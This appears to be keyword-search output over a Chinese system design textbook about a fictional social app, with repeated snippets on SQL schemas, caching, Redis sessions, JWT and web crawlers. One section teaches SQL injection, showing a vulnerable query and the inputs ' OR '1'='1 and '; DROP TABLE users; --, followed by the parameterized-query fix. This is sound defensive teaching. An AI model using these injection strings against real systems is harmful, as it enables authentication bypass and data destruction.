  c05_b10.md: ...让删除用户变复杂（必须扫描所有帖子内容找用户名）  **查询——所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.created_at, author.username...
  c05_b10.md: ...后考虑基于索引的方案和基于反规范化的方案及其 tradeoff（权衡）。  **答案：**  **诊断：** 查询是 `SELECT COUNT(*) FROM likes WHERE post_id = 12345`。在 1.1 billion（11...
  c05_b11.md: ...1 WHERE id = 12345;     COMMIT;  现在“帖子 12345 有多少赞？”变成：      SELECT like_count FROM posts WHERE id = 12345;  这是 O(1) 主键查找——微秒级而...
  c05_b12.md: ...终与帖子一起读、从不单独查询的简单 URL 列表，数组列在这个规模下是实用选择。  **查询与索引需求：**      SELECT id, content, image_urls, created_at     FROM posts     WHER...
  c06_b05.md: ...INTEGER, PRIMARY KEY (user_id, friend_id));   “Alice 的朋友”是：`SELECT friend_id FROM friendships WHERE user_id = alice_id`  “Alic...
  c06_b05.md: ...ps WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FROM friendships f1     JOIN frie...
  c12_b05.md: ...Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极的查询：       SELECT post_id, like_count     FROM posts     ORDER BY like_count...
  c17_b06.md: ...e: fetch_posts (148ms)             [55ms - 80ms]  Database: SELECT posts WHERE id IN (...) (25ms)             [85ms - 195ms] U...
  c17_b06.md: ...etch_authors (110ms)               [88ms - 190ms] Database: SELECT users WHERE id IN (...) (102ms)           [202ms - 235ms] R...
  c19_b06.md: ...）：       user_input = request.get("username")     query = f"SELECT * FROM users WHERE username = '{user_input}'"     db.execut...
  c19_b06.md: ...er_input}'"     db.execute(query)   如果用户提交用户名 `alice`，查询变成 `SELECT * FROM users WHERE username = 'alice'`——无害。  但如果用户提交 `' OR...
  c19_b06.md: ...username = 'alice'`——无害。  但如果用户提交 `' OR '1'='1`，查询变成：       SELECT * FROM users WHERE username = '' OR '1'='1'   条件 `'1'='1'`...
  c19_b06.md: ...击者完全绕过了认证。  更具破坏性的输入：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这...
  c19_b06.md: ...eterized queries）**（也称 prepared statements）：       query = "SELECT * FROM users WHERE username = ?"     db.execute(query, [use...
  c25_b06.md: ...transaction），事务如下：      BEGIN;       -- 锁定行程记录，防止并发计费       SELECT * FROM trips WHERE trip_id = X FOR UPDATE;            -- 验证...

=== create (19 occurrences) ===
  c05_b03.md: ...harding”（O(log n) 查找），得到页码。  当你在 `posts.user_id` 上建索引：      CREATE INDEX idx_posts_user_id ON posts(user_id);  数据库会创建一个 B-tree...
  c05_b06.md: ...一台机器，但现在数据在重启后持久化，并且可以灵活查询。  **SocialSnap v1 schema：**      CREATE TABLE users (         id          SERIAL PRIMARY KEY,...
  c05_b06.md: ...created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id          SERIAL PRIMARY KEY,...
  c05_b06.md: ...created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE follows (         follower_id INTEGER REFERENCES user...
  c05_b06.md: ...PRIMARY KEY (follower_id, followed_id)     );          CREATE TABLE likes (         user_id     INTEGER REFERENCES users(...
  c05_b06.md: ...post_id)     );          -- Indexes for common queries     CREATE INDEX idx_posts_user_id ON posts(user_id);     CREATE INDEX...
  c05_b06.md: ...s     CREATE INDEX idx_posts_user_id ON posts(user_id);     CREATE INDEX idx_posts_created_at ON posts(created_at DESC);...
  c05_b06.md: ...DEX idx_posts_created_at ON posts(created_at DESC);         CREATE INDEX idx_follows_followed_id ON follows(followed_id);  **为...
  c05_b10.md: ...什么实体，以及它如何与 posts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE mentions (         post_id     INTEGER REFERENCES pos...
  c05_b10.md: ...EY (post_id, user_id)     );          -- 快速找到提及某用户的所有帖子     CREATE INDEX idx_mentions_user_id ON mentions(user_id);     -- 快速找...
  c05_b10.md: ...很多索引页——对有几百万赞的热门帖子尤其如此。  **方案 1：在 `post_id` 上添加/修复索引**      CREATE INDEX idx_likes_post_id ON likes(post_id);...
  c05_b12.md: ...按顺序返回它们。  **最佳索引：** `(user_id, created_at DESC)` 复合索引：      CREATE INDEX idx_posts_user_created ON posts(user_id, created_at D...
  c06_b11.md: ...维护计数。  **答案：**  **关系型方案：**  Schema（加入 SocialSnap v1）：       CREATE TABLE hashtags (         post_id     INTEGER REFERENCES pos...
  c06_b11.md: ...ULL,         created_at  TIMESTAMP DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON hashtags(tag);     CREATE INDEX i...
  c06_b11.md: ...);     CREATE INDEX idx_hashtags_tag ON hashtags(tag);     CREATE INDEX idx_hashtags_created_at ON hashtags(created_at);   热门...
  c06_b12.md: ...可轻松处理多年。  **推荐：关系型数据库（PostgreSQL），为临床笔记使用 JSONB 列。**       CREATE TABLE patients (         id              SERIAL PRIMARY KEY...
  c06_b12.md: ...NOT NULL,         insurance_id    VARCHAR(100)     );      CREATE TABLE medications (         id              SERIAL PRIMARY...
  c06_b12.md: ...nded_on        DATE  -- NULL means still active     );      CREATE TABLE clinical_notes (         id              SERIAL PRIMA...
  c09_b08.md: ...→ fetch user 42     POST /users                      → create a new user     PUT  /users/42                   → replace u...

=== value (19 occurrences) ===
  c06_b01.md: ...B, CouchDB, Firestore | | 键值存储（Key-Value Store） | Key → 不透明 value | 极致速度，简单 | Redis, DynamoDB, Memcached | | 列族存储（Column-Fami...
  c06_b03.md: ...### 6.3 键值存储——极致速度，最大简单性  最简单的数据模型：一个 key 映射到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       SET user:1:se...
  c06_b03.md: ...### 6.3 键值存储——极致速度，最大简单性  最简单的数据模型：一个 key 映射到一个 value。value 是不透明的——数据库存储它而不理解其结构。你通过 key 取回它。       SET user:1:session_...
  c06_b03.md: ...作是亚毫秒级，因为 Redis 把整个数据集放在内存中。没有索引、没有 schema、没有 join。只有 key 和 value。   #### 键值存储何时胜出  **缓存：** 第一大用例。用 TTL（time-to-live，生存时间）存储频...
  c06_b10.md: ...（键值存储）存当前位置：**       Key: "driver:{driver_id}:location"     Value: {lat: 37.7749, lon: -122.4194, updated_at: 1705312000}...
  c07_b04.md: ...n the cache     2. If cache HIT:        - Return the cached value     3. If cache MISS:        - Query the database for the v...
  c07_b04.md: ...e     3. If cache MISS:        - Query the database for the value        - Store the value in the cache with a TTL        - R...
  c07_b04.md: ...- Query the database for the value        - Store the value in the cache with a TTL        - Return the value to the ca...
  c07_b04.md: ...Store the value in the cache with a TTL        - Return the value to the caller   写入新值：       1. Write the new value to the d...
  c07_b04.md: ...turn the value to the caller   写入新值：       1. Write the new value to the database     2. Invalidate (delete) the old cached v...
  c07_b04.md: ...e to the database     2. Invalidate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Al...
  c07_b05.md: ...** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return succe...
  c07_b05.md: ...步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return success   **读取路径：**       1. Check c...
  c07_b05.md: ...aching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Write value to cache (fast, in-memory)     2. Mark the entry as "dirty"...
  c09_b15.md: ...状态是一个带 TTL 的 Redis key：       Key:   presence:{user_id}     Value: {last_seen: timestamp, status: "online"}     TTL:   5 minu...
  c10_b11.md: ...append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储**提供扁平的 key-value 命名空间，每个对象都是不透明的 blob，通过 HTTP 访问（`PUT`/`GET`/`DELETE` by key...
  c10_b19.md: ...文件的正确选择，但不适合大规模媒体或高吞吐分析。  **对象存储**（S3 及等价物）为任意二进制数据提供扁平 key-value 命名空间，实际上无限扩展、高持久性、每字节低成本。它是用户上传媒体、大数据集和备份的正确存储层级。  **HDFS**...
  c11_b04.md: ...# TTL: 24 小时             json.dumps(session_data)    # value         )          return session_id      def get_session(s...
  c28_b11.md: ...(MongoDB)** (Ch 6) | 文档级操作低 | 最终（默认）；可配置 | 高（副本集） | 中 **Key-value store (Redis)** (Ch 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模式） | 低...

=== through (19 occurrences) ===
  c07_b04.md: ...据**。因此设置 TTL 是一个直接调节新鲜度与性能 tradeoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1...
  c07_b05.md: ...+ 缓存）。写入延迟增加。如果你写入的数据永远不会被读取，就浪费了缓存空间和写入开销（“写放大”问题）。  Write-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behi...
  c07_b05.md: ...时，5,000 个请求会在同一秒落到数据库。数据库此前几乎不处理这个 key 的负载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-thro...
  c07_b05.md: ...ough 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-through 通常更可取，正因为它消除了惊群。   ### 7.5 驱逐——缓存满了怎么办  缓存驻留在内存中。内存昂贵且有限。最终...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1...
  c07_b05.md: ...+ 缓存）。写入延迟增加。如果你写入的数据永远不会被读取，就浪费了缓存空间和写入开销（“写放大”问题）。  Write-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behi...
  c07_b05.md: ...时，5,000 个请求会在同一秒落到数据库。数据库此前几乎不处理这个 key 的负载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-thro...
  c07_b05.md: ...ough 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-through 通常更可取，正因为它消除了惊群。   ### 7.5 驱逐——缓存满了怎么办  缓存驻留在内存中。内存昂贵且有限。最终...
  c07_b11.md: ...提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加...
  c07_b11.md: ...有数据都会被访问的系统（提前缓存所有东西会浪费）。例子：用户资料查找——你只缓存用户实际请求的资料。  **Write-through：** 每次数据库写入也立即写入缓存。缓存始终与数据库同步。最适合：写入后随即被频繁读取的数据。例子：产品库存数——仓库...
  c07_b13.md: ...是他们在考虑的三种数据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b) 用户的未读通...
  c07_b13.md: ...子总数”计数器  提示  想想每种数据多久变化一次、多少用户访问它、旧数据如何影响用户体验。对计数器，想想 write-through 是否会造成数据库瓶颈。  **答案：**  **(a) 用户头像照片：**  访问模式：读密集型。用户的照片出现在他们...
  c07_b13.md: ...数近实时更新。旧数据后果：显示“3 条未读”而实际有 7 条，如果持续超过几秒会令人沮丧。  缓存策略：**Write-through 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 cache-asid...
  c07_b13.md: ...NCR`/`DECR` 操作（原子、亚毫秒）。Redis 成为该计数的事实来源，数据库作为备份。这本质上是 write-through：每个通知事件同时更新数据库和 Redis 计数器。  缓存 key：`user:{user_id}:unread_co...
  c07_b17.md: ...查缓存，未命中时取数据库，填充缓存，返回。它是懒加载的（只缓存被请求的内容），并把失效责任交给应用。  **Write-through** 每次写入都保持缓存与数据库同步，消除陈旧但增加写入开销。**Write-behind** 批量写入，提升写性能但...
  c28_b11.md: ...命中降低读；未命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 | 中——手动失效 **Write-through cache** (Ch 7) | 写延迟更高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB...

=== runbook (19 occurrences) ===
  c17_b08.md: ...动化的人类判断，page 相对不频繁，因为好的监控在问题还没 page 级严重时就及早发现。   #### 告警路由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警是什么、为什么重要、我首先该做什么？  **Runbook**（...
  c17_b08.md: ...由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警是什么、为什么重要、我首先该做什么？  **Runbook**（也称 playbook）是附加到告警的预写响应流程。一个“Redis 错误率高”的 runbook 可能说：  1...
  c17_b08.md: ...做什么？  **Runbook**（也称 playbook）是附加到告警的预写响应流程。一个“Redis 错误率高”的 runbook 可能说：  1. 在 Redis 仪表盘检查 Redis 集群状态 2. 检查问题是否限于一个 shard 还是影响所...
  c17_b08.md: ...；如果 30 分钟内部署过，回滚 5. 如果最近没有部署：上报数据库团队；把 Redis 客户端熔断器设为 OPEN  Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警时，runbook...
  c17_b08.md: ...Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警时，runbook 防止他们犯下灾难性错误。当同一告警一个月内第三次响起，runbook 会更新：“如果再次发生，在关闭前先修复根因。”...
  c17_b08.md: ...应。初级工程师 on-call 遇到不熟悉告警时，runbook 防止他们犯下灾难性错误。当同一告警一个月内第三次响起，runbook 会更新：“如果再次发生，在关闭前先修复根因。”   #### 权衡矩阵：SLI/SLO 与可观测性  回想第 2 章引...
  c17_b08.md: ...动化的人类判断，page 相对不频繁，因为好的监控在问题还没 page 级严重时就及早发现。   #### 告警路由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警是什么、为什么重要、我首先该做什么？  **Runbook**（...
  c17_b08.md: ...由与 Runbook  当告警响起，on-call 工程师需要知道：这个告警是什么、为什么重要、我首先该做什么？  **Runbook**（也称 playbook）是附加到告警的预写响应流程。一个“Redis 错误率高”的 runbook 可能说：  1...
  c17_b08.md: ...做什么？  **Runbook**（也称 playbook）是附加到告警的预写响应流程。一个“Redis 错误率高”的 runbook 可能说：  1. 在 Redis 仪表盘检查 Redis 集群状态 2. 检查问题是否限于一个 shard 还是影响所...
  c17_b08.md: ...；如果 30 分钟内部署过，回滚 5. 如果最近没有部署：上报数据库团队；把 Redis 客户端熔断器设为 OPEN  Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警时，runbook...
  c17_b08.md: ...Runbook 编码机构知识。资深工程师第一次遇到某个告警时学到正确响应。初级工程师 on-call 遇到不熟悉告警时，runbook 防止他们犯下灾难性错误。当同一告警一个月内第三次响起，runbook 会更新：“如果再次发生，在关闭前先修复根因。”...
  c17_b08.md: ...应。初级工程师 on-call 遇到不熟悉告警时，runbook 防止他们犯下灾难性错误。当同一告警一个月内第三次响起，runbook 会更新：“如果再次发生，在关闭前先修复根因。”   #### 权衡矩阵：SLI/SLO 与可观测性  回想第 2 章引...
  c17_b09.md: ...48——降级开始一分钟——on-call 工程师收到 page：“Redis 错误率 18%，p99 延迟 28 秒。”Runbook 说：检查 Redis 集群状态，检查熔断器是否已打开。  第 16 章的熔断器已经开始触发。应用正通过数据库回退提供降...
  c28_b03.md: ...15 分钟（15 minutes）内升级给领域专家。清晰的升级路径防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审...
  c28_b03.md: ...防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minu...
  c28_b03.md: ...查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minutes）则重启副本。Runbook 把隐性知识（上次调试该问题的工程师脑子里的东西）变成显性知识（凌晨 3 点任何 on-call 工程师都能获取）。...
  c28_b03.md: ...15 分钟（15 minutes）内升级给领域专家。清晰的升级路径防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审...
  c28_b03.md: ...防止 on-call 工程师独自卡住数小时。  **Runbook：** 已知故障模式的文档化流程。当数据库副本落后时，runbook 写：第 1 步，检查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minu...
  c28_b03.md: ...查 lag 查询；第 2 步，审查慢查询日志；第 3 步，若 lag > 30 分钟（30 minutes）则重启副本。Runbook 把隐性知识（上次调试该问题的工程师脑子里的东西）变成显性知识（凌晨 3 点任何 on-call 工程师都能获取）。...

=== frontier (19 occurrences) ===
  c23_b02.md: ...crawl 延迟。这不仅是礼貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **URL frontier 设计。** per-domain 队列、礼貌控制和优先级（某些页面更重要，应优先爬取）的组合称为 **URL fron...
  c23_b02.md: ...tier 设计。** per-domain 队列、礼貌控制和优先级（某些页面更重要，应优先爬取）的组合称为 **URL frontier**。URL frontier 是大型爬虫的核心调度数据结构。...
  c23_b02.md: ...domain 队列、礼貌控制和优先级（某些页面更重要，应优先爬取）的组合称为 **URL frontier**。URL frontier 是大型爬虫的核心调度数据结构。...
  c23_b03.md: ...#### 定义：URL Frontier  **URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的...
  c23_b03.md: ...#### 定义：URL Frontier  **URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的 URL frontier 具备：...
  c23_b03.md: ...URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的 URL frontier 具备：  1. **多队列**，通常每个域名或域名组一个，以执行 per-domain 爬取速率 2. **优先队列*...
  c23_b03.md: ...URL 先爬） 3. **调度层**，选择下一个从哪个域名队列拉取，遵守 crawl 延迟  plain 语言：URL frontier 是爬虫的待办清单，组织方式是重要工作先做，但没有任何单个网站被我们的请求压垮。   #### 优先爬取什么？  并非所...
  c23_b03.md: ...其可信度。   #### 常见误解  一个常见误解是网络爬虫主要是网络问题——尽快发送 HTTP 请求。实际上，URL frontier 的调度和礼貌逻辑比抓取本身更工程密集。速率限制（限流）、per-domain 队列、`robots.txt` 合规、重...
  c23_b03.md: ...#### 定义：URL Frontier  **URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的...
  c23_b03.md: ...#### 定义：URL Frontier  **URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的 URL frontier 具备：...
  c23_b03.md: ...URL frontier** 是网络爬虫中管理接下来获取哪些 URL、以什么顺序、以什么速率的组件。设计良好的 URL frontier 具备：  1. **多队列**，通常每个域名或域名组一个，以执行 per-domain 爬取速率 2. **优先队列*...
  c23_b03.md: ...URL 先爬） 3. **调度层**，选择下一个从哪个域名队列拉取，遵守 crawl 延迟  plain 语言：URL frontier 是爬虫的待办清单，组织方式是重要工作先做，但没有任何单个网站被我们的请求压垮。   #### 优先爬取什么？  并非所...
  c23_b03.md: ...其可信度。   #### 常见误解  一个常见误解是网络爬虫主要是网络问题——尽快发送 HTTP 请求。实际上，URL frontier 的调度和礼貌逻辑比抓取本身更工程密集。速率限制（限流）、per-domain 队列、`robots.txt` 合规、重...
  c23_b09.md: ...#### 概念检测  **Q1.** 什么是 URL frontier，为什么它比简单 FIFO 队列更复杂？  **答案：** URL frontier 是爬虫的调度数据结构——决定接下来...
  c23_b09.md: ...**Q1.** 什么是 URL frontier，为什么它比简单 FIFO 队列更复杂？  **答案：** URL frontier 是爬虫的调度数据结构——决定接下来获取哪些 URL、以什么顺序、以什么速率。简单 FIFO 队列不足，原因有三：(1)...
  c23_b09.md: ...、以什么速率。简单 FIFO 队列不足，原因有三：(1) 它会让爬虫向单个域名发送大量并行请求，压垮该域服务器。URL frontier 用 per-domain 队列执行礼貌策略（每个域名一次一个请求，可配置延迟）。(2) 有些页面更重要，应优先爬取（高...
  c23_b09.md: ...) 有些页面更重要，应优先爬取（高 PageRank 域名、频繁更新站点）。FIFO 队列平等对待所有 URL；URL frontier 使用优先级机制。(3) frontier 必须集成重复检测，避免把已见 URL 重新入队。  **Q2.** 用自己的...
  c23_b13.md: ...本章总结  本章从最基本的操作构建搜索引擎：爬取、索引、排序和服务。  **网络爬虫** 通过跟随链接发现网络，URL frontier 是其核心调度结构。关键洞察是爬虫作为侦探：它跟随证据（链接）同时评估来源可信度。礼貌、通过 Bloom filter...
  c28_b14.md: ...延迟开销（批量计算） | 最终（定期重算） | N/A | 高——分布式图计算 **Web crawler / URL frontier** (Ch 23) | N/A | 最终（网络持续被抓取） | 高（分布式爬虫） | 高——礼貌性、去重、优先队列 *...

=== read (18 occurrences) ===
  c02_b09.md: ...本还没追上——就可能有人透支，或柜员给出错误信息。由于旧读导致双花（同一笔钱花两次）会终结业务。需要强一致性，或至少强 read-your-writes 一致性。...
  c05_b05.md: ...换性能：  | 级别 | 脏读 | 不可重复读 | 幻读 | 用例 | |---|---|---|---|---| | Read Uncommitted（读未提交） | 可能 | 可能 | 可能 | 很少有用 | | Read Committed（...
  c05_b05.md: ...---|---| | Read Uncommitted（读未提交） | 可能 | 可能 | 可能 | 很少有用 | | Read Committed（读已提交） | 防止 | 可能 | 可能 | 大多数 Web 应用（PostgreSQL 默认）...
  c05_b05.md: ...） | 防止 | 可能 | 可能 | 大多数 Web 应用（PostgreSQL 默认） | | Repeatable Read（可重复读） | 防止 | 防止 | 可能 | 事务内的金融读取 | | Serializable（可串行化） | 防止...
  c05_b05.md: ...rializable（可串行化） | 防止 | 防止 | 防止 | 最高正确性要求 |  大多数 Web 应用使用 **Read Committed**——它防止读到另一个事务未提交的更改，同时保持良好并发。只在正确性要求时才用 Serializa...
  c05_b05.md: ...。复制型关系数据库可以在每个副本上 ACID-一致，但跨副本不是线性一致的。 2. **隔离级别很重要。** 如果你在 Read Committed 隔离下运行（常见默认），仍可能遇到不可重复读——请求开始时读到的值在结束时可能已经改变。这是否重要...
  c05_b09.md: ...于 10,000（1 万）行的表，索引帮助很小——全表扫描已经够快。 3. **读/写比例如何？** 对 mostly-read 的表（如国家代码查询表），可以大胆加索引。对 mostly-write 的表（如事件日志），应谨慎加索引。 4. **...
  c05_b14.md: ...要么全有要么全无）、一致性（没有无效状态）、隔离性（并发事务互不干扰）、持久性（已提交数据在崩溃后幸存）。隔离有级别——Read Committed 是常见默认，Serializable 在更高成本下提供最大正确性。  我们介绍了 **Social...
  c06_b02.md: ...很快。  **代价（一致性）：** 大多数文档存储提供比关系型数据库更弱的一致性。MongoDB 的默认隔离级别相当于“Read Committed”，多文档事务直到 4.0 版（2018 年）才加入——并且伴随性能开销。跨多个文档建模数据可能带来...
  c10_b05.md: ...方面历史上是最终一致的——如果你上传对象新版本并立即读取，可能拿到旧版本。现代对象存储（2020 年后的 S3）提供强 read-after-write 一致性，但对任何具体供应商都值得验证。  **扁平命名空间：** 没有目录，列出所有对象是完整...
  c10_b11.md: ...存储**（如 NFS）提供分层目录结构，客户端挂载后像本地磁盘一样使用。多个客户端可同时读写文件。文件操作——open、read、write、seek、append——在字节级别工作，文件系统维护元数据（权限、修改时间、目录结构）。  **对象存储...
  c21_b08.md: ...#### 投递状态机  每条消息经历状态转换：      SENT → DELIVERED → READ  * **SENT：** 发送者客户端把消息提交到服务器。服务器已持久化。 * **DELIVERED：** 接收者客...
  c21_b08.md: ...化。 * **DELIVERED：** 接收者客户端收到消息（客户端通过 WebSocket 发送投递确认）。 * **READ：** 接收者打开对话，消息被显示（客户端发送已读确认）。  这些状态转换发生在不同设备上。发送者在 S1。接收者在 S...
  c21_b13.md: ...事件序列，包括所有网络调用、数据库写入和服务器间通信。  提示  追踪投递状态机：SENT → DELIVERED → READ。每个状态转换都需要一次数据库写入和一个实时事件回发发送者。思考连接服务器在步骤间崩溃会怎样。  **答案：**  **...
  c21_b13.md: ...执推送到 A 的 WebSocket。 14. A 的 UI 更新 M456 为双勾（已送达接收者设备）。  **状态：READ** 15. B 打开包含 M456 的对话。 16. B 的客户端发送 `{type: "read_ack", con...
  c26_b06.md: ...*会话存储**（SocialSnap v4，第 11 章）：存储用户会话 token。N=3，W=2，R=2。会话需要 read-your-writes 一致性（你登录后，下个请求必须找到会话）。W + R = 4 > N = 3，读 quorum...
  c28_b12.md: ...al scaling** (Ch 11) | 更低延迟（更快硬件） | N/A | 低——单机器 SPOF | 低 **Read replicas** (Ch 12) | 读延迟更低 | 最终（复制 lag） | 读可用性更高 | 中——故障转移配...
  c28_b14.md: ...） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用） | 中–高（扇出基础设施） **Fan-out on read** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **Hybrid f...

=== session (18 occurrences) ===
  c06_b03.md: ...储频繁访问的数据库结果。把用户资料缓存 60 秒；下次请求直接返回缓存版本，无需命中数据库。  **会话存储：** 按 session ID 存认证 token 和会话数据。任何应用服务器都能快速查找任何用户的会话，无需数据库查询。  **计数器和限流器...
  c07_b07.md: ...**原子计数器操作：** `INCR counter_key` 原子递增计数器，无竞态条件。非常适合浏览数、点赞数、session ID。  **持久化选项：** Redis 支持两种持久化模式——RDB 快照（定期完整快照到磁盘）和 AOF（App...
  c10_b11.md: ...受：100,000 并发会话 × 1 KB = 约 100 MB 内存，在 Redis 定价下可忽略。  访问模式：按 session ID 随机访问（key 查找）。延迟要求：亚毫秒。成本：对小数据可行；对大数据昂贵。  **对象存储（类 S3）：**...
  c11_b04.md: ...e, "created_at": now()}          redis.setex(             f"session:{session_id}",   # key             3600 * 24,...
  c11_b04.md: ...n_id}")         if data is None:             return None  # Session expired or invalid         return json.loads(data)   现在 Ali...
  c11_b04.md: ...存在 Redis 中后，会话可以被查看和管理。“登出用户 42 的所有会话”变成：按 user_id 过滤 `DEL session:*`（或维护反向索引 `user:42:sessions = [sess_id1, sess_id2, ...]`）。...
  c11_b04.md: ...e, "created_at": now()}          redis.setex(             f"session:{session_id}",   # key             3600 * 24,...
  c11_b04.md: ...n_id}")         if data is None:             return None  # Session expired or invalid         return json.loads(data)   现在 Ali...
  c11_b04.md: ...存在 Redis 中后，会话可以被查看和管理。“登出用户 42 的所有会话”变成：按 user_id 过滤 `DEL session:*`（或维护反向索引 `user:42:sessions = [sess_id1, sess_id2, ...]`）。...
  c11_b06.md: ...e 的账户被入侵。SocialSnap 安全团队强制登出 Alice 的账户。用 Redis 会话，这很简单：`DEL session:alice_session_id` 或 `DEL user:42:sessions`。Alice 的下一个请求找不到会...
  c11_b06.md: ...key——让所有用户的所有 token 失效（强制全局登出）  这些 workaround 都不如 Redis 里的 session ID 干净，因为 session ID 可以一条命令删除。...
  c11_b06.md: ...ken 失效（强制全局登出）  这些 workaround 都不如 Redis 里的 session ID 干净，因为 session ID 可以一条命令删除。...
  c21_b10.md: ...户没注意到；架构显著更 resilient。  **v4（第 11 章）：** 水平扩展加入三台应用服务器。首个分布式 session bug：session 存在某台服务器，用户下一请求被另一台处理时却登录了。通过把 session 移到 Redis...
  c21_b10.md: ...resilient。  **v4（第 11 章）：** 水平扩展加入三台应用服务器。首个分布式 session bug：session 存在某台服务器，用户下一请求被另一台处理时却登录了。通过把 session 移到 Redis 修复。无状态（state...
  c21_b10.md: ...服务器。首个分布式 session bug：session 存在某台服务器，用户下一请求被另一台处理时却登录了。通过把 session 移到 Redis 修复。无状态（stateless）要求被内化。  **v5（第 12 章）：** 数据库成为瓶颈。加...
  c21_b10.md: ...按 `conversation_id` 分片）存储 DM 消息 * **Redis 集群** 用于缓存（资料、feed、session 数据）和连接注册表 * **消息队列（Kafka）** 用于通知投递和分析事件 * **通知服务** 消费 Kafka...
  c27_b02.md: ...可见。  **变革信号：** 单个应用服务器在高峰时段 CPU 使用率达 90%。添加第二台服务器暴露了 sticky session 问题：用户被随机路由到没有其会话的服务器。...
  c27_b11.md: ...无状态会话 | 以会话迁移 + Redis 依赖为代价获得更高吞吐 | 单服务器 90% CPU；发现 sticky session 破坏 v4 → v5 | 数据库分片 + 读副本 | 以跨分片查询复杂度和迁移痛苦为代价获得读写可扩展性 | 数据库...

=== payload (18 occurrences) ===
  c08_b14.md: ...到了”：** 一条 15 分钟前的“你的车 2 分钟后到”通知不仅无用，还会 actively 误导。这些事件应在事件 payload 中包含过期时间戳；消费者处理前检查时间戳，并丢弃超过动作相关窗口的事件。  **架构修复——事件过期元数据：**...
  c11_b06.md: ...一个紧凑、URL 安全的字符串，包含：  1. 一个 **header**（算法和 token 类型） 2. 一个 **payload**（claims——会话数据：user_id、username、roles、过期时间） 3. 一个 **signatu...
  c11_b06.md: ...signature**（服务器用 secret key 生成的加密签名）  服务器在登录时签发 JWT：  1. 创建 payload：`{"user_id": 42, "username": "alice", "exp": 1709510400}` 2...
